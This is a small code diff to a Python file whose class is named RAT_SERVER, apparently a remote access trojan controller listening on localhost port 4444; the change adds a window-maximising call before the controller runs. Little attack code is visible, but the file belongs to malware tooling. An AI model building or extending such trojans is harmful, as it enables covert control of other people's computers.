@@ -1,5 +1,6 @@
 import random
 import socket, os
+import win32gui, win32con
 
 class RAT_SERVER:
     def __init__(self, host, port):
@@ -470,4 +471,6 @@ rat = RAT_SERVER('127.0.0.1', 4444)
 
 if __name__ == '__main__':
     rat.build_connection()
+    hwnd = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
     rat.execute()
